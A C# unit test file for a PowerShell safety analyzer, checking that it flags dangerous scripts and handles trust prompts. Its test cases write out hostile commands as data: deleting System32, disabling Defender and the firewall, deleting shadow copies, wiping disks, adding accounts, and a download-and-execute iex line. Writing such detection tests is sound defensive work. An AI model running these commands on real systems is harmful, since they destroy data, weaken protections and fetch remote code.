using Shelly.Core;
using Xunit;
using Xunit.Abstractions;

namespace Shelly.Core.Tests;

/// <summary>Runs the real Analyzer.ps1 (the safety rules on PowerShell's AST; the full corpus is in SafetyCorpusTests) in pwsh / powershell.
/// Without PowerShell on the machine these tests only log that they were not run.</summary>
public class SafetyScannerTests
{
    readonly ITestOutputHelper log;
    public SafetyScannerTests(ITestOutputHelper log) { this.log = log; }

    static readonly (string Name, string Code, string Rule, string Sev)[] Cases =
    {
        ("delsys.ps1", "Remove-Item -Path C:\\Windows\\System32 -Recurse -Force", "DelSys", "high"),
        ("delrec.ps1", "Remove-Item .\\out -Recurse -Force", "Del", "medium"),
        ("rmalias.ps1", "rm *.log -fo", "Del", "medium"),
        ("disk.ps1", "Format-Volume -DriveLetter D", "Disk", "high"),
        ("boot.ps1", "bcdedit /set {current} safeboot minimal", "Boot", "high"),
        ("power.ps1", "Restart-Computer -Force", "Power", "high"),
        ("shutdown.ps1", "shutdown /r /t 0", "Power", "high"),
        ("regdel.ps1", "reg delete HKLM\\Software\\X /f", "RegDel", "high"),
        ("regwrite.ps1", "Set-ItemProperty -Path HKLM:\\SOFTWARE\\X -Name A -Value 1", "RegWrite", "medium"),
        ("policy.ps1", "Set-ExecutionPolicy Unrestricted -Scope LocalMachine", "ExecPolicy", "high"),
        ("policyproc.ps1", "Set-ExecutionPolicy Bypass -Scope Process", "ExecPolicy", "medium"),
        ("defender.ps1", "Set-MpPreference -DisableRealtimeMonitoring $true", "Defender", "high"),
        ("firewall.ps1", "netsh advfirewall set allprofiles state off", "Firewall", "high"),
        ("service.ps1", "Stop-Service WinDefend", "Service", "high"),
        ("svcdel.ps1", "sc.exe delete MyService", "SvcDelete", "high"),
        ("account.ps1", "net user bob P@ss /add", "Account", "high"),
        ("dlexec.ps1", "iex (New-Object Net.WebClient).DownloadString('http://x/y.ps1')", "DlExec", "high"),
        ("iex.ps1", "Invoke-Expression $code", "Dynamic", "high"),
        ("encoded.ps1", "powershell -enc ZQBjAGgAbwAgAGgAaQA=", "Encoded", "high"),
        ("elevate.ps1", "Start-Process notepad -Verb RunAs", "Elevate", "medium"),
        ("shadows.ps1", "vssadmin delete shadows /all /quiet", "Shadows", "high"),
        ("wipe.ps1", "cipher /w:C:\\", "Wipe", "high"),
        ("nested.ps1", "cmd /c \"rd /s /q C:\\\"", "DelSys", "high"),
        ("nestedps.ps1", "powershell -Command \"Remove-Item C:\\Windows -Recurse\"", "DelSys", "high"),
    };

    [Fact]
    public void Finds_dangerous_commands()
    {
        var res = TestUtil.Analyze(Cases.Select(c => (c.Name, c.Code)).ToArray());
        if (TestUtil.Pwsh() == null) { log.WriteLine("PowerShell not found: analyzer tests skipped"); return; }
        Assert.Equal(Cases.Length, res.Count);
        foreach (var c in Cases)
        {
            var r = res.Single(x => Path.GetFileName(x.Path) == c.Name);
            Assert.True(r.Danger.Any(d => d.Rule == c.Rule && d.Sev == c.Sev),
                c.Name + ": expected " + c.Rule + "/" + c.Sev + ", got " + string.Join(", ", r.Danger.Select(d => d.Rule + "/" + d.Sev)));
            Assert.All(r.Danger, d => Assert.Equal(1, d.Line));
        }
    }

    [Fact]
    public void Safe_code_comments_and_strings_are_not_flagged()
    {
        var res = TestUtil.Analyze(
            ("safe.ps1", "# Remove-Item C:\\Windows -Recurse\nWrite-Host 'Format-Volume is dangerous'\nGet-ChildItem $env:TEMP | Measure-Object\nSet-ExecutionPolicy AllSigned"),
            ("summary.ps1", File.ReadAllText(Path.Combine(AppContext.BaseDirectory, "TestData", "System summary.ps1"))));
        if (TestUtil.Pwsh() == null) return;
        Assert.All(res, r => Assert.Empty(r.Danger));
    }

    [Fact]
    public void Reports_params_requires_hints_and_errors()
    {
        var res = TestUtil.Analyze(
            ("p.ps1", "#Requires -Version 7.2\n# Desc here\nparam([Parameter(Mandatory)][string]$Name, [ValidateSet('a','b')]$Mode='a', [switch]$Force)\n$x = $null ?? 1\nGet-WmiObject Win32_OS"),
            ("broken.ps1", "function f {\n  Write-Host 'x'\n"));
        if (TestUtil.Pwsh() == null) return;
        var p = res.Single(r => r.Path.EndsWith("p.ps1"));
        Assert.Equal("Desc here", p.Desc);
        Assert.Equal("7.2", p.Req.Version);
        Assert.Equal(new[] { "Name", "Mode", "Force" }, p.Params.Select(x => x.Name));
        Assert.True(p.Params[0].Mandatory);
        Assert.Equal(new[] { "a", "b" }, p.Params[1].SetValues);
        Assert.Equal("switch", p.Params[2].Kind);
        Assert.Contains("??", p.Ps7);
        Assert.Contains("Get-WmiObject", p.WinPs);
        var b = res.Single(r => r.Path.EndsWith("broken.ps1"));
        Assert.NotEmpty(b.Errors);
    }

    [Fact]
    public void Safety_level_and_trust()
    {
        var f = new List<DangerFinding> { new() { Rule = "Del", Sev = "medium", Line = 3 }, new() { Rule = "DelSys", Sev = "high", Line = 9 } };
        Assert.Equal("high", Safety.Level(f));
        Assert.Equal("medium", Safety.Level(f.Take(1)));
        Assert.Equal("", Safety.Level(Array.Empty<DangerFinding>()));
        Assert.Equal("DelSys", Safety.Sorted(f)[0].Rule);

        string dir = TestUtil.TempDir();
        string path = Path.Combine(dir, "x.ps1");
        File.WriteAllText(path, "Remove-Item . -Recurse");
        var s = new Settings();
        Assert.True(Safety.Needed(s, f, "inline", "x.ps1", path));
        Assert.False(Safety.Needed(s, Array.Empty<DangerFinding>(), "inline", "x.ps1", path));
        Assert.True(Safety.Needed(s, Array.Empty<DangerFinding>(), "admin", "x.ps1", path));   // admin runs always confirm
        var warn = f.Take(1).ToList();
        Safety.AddTrust(s, "x.ps1", Safety.TrustKey("x.ps1", path));
        Assert.False(Safety.Needed(s, warn, "inline", "x.ps1", path));                            // warnings: trust by SHA-256
        Assert.True(Safety.Needed(s, f, "inline", "x.ps1", path));                                // danger: asks every time
        Assert.False(Safety.CanTrust(f));
        Assert.True(Safety.CanTrust(warn));
        File.AppendAllText(path, "\n# changed");                                                  // a new version is not trusted
        Assert.True(Safety.Needed(s, warn, "inline", "x.ps1", path));
        Assert.False(Safety.Needed(s, new[] { new DangerFinding { Rule = "DlTrusted", Sev = "low" } }, "inline", "x.ps1", path));  // info never asks
        s.SafetyWarnings = false;
        Assert.False(Safety.Needed(s, warn, "admin", "x.ps1", path));
        Assert.True(Safety.Needed(s, f, "inline", "x.ps1", path));                                // the switch doesn't silence danger
    }

    [Fact]
    public void Danger_texts_exist_in_both_languages()
    {
        foreach (var rule in new[] { "Account", "Acl", "Boot", "Defender", "Del", "DelSys", "Disk", "DlExec", "Download", "Elevate", "Encoded", "ExecPolicy", "Firewall", "Iex", "NetAdapter", "Dynamic", "NetDelete", "Task", "Logs", "AddType", "ScriptCall", "DlTrusted", "Power", "RegDel", "RegWrite", "Service", "Shadows", "SvcDelete", "Wipe" })
        {
            Assert.True(Loc.Has("r" + rule), rule);
            var d = new DangerFinding { Rule = rule, Detail = "X" };
            Assert.Contains("X", d.Text);
        }
    }
}
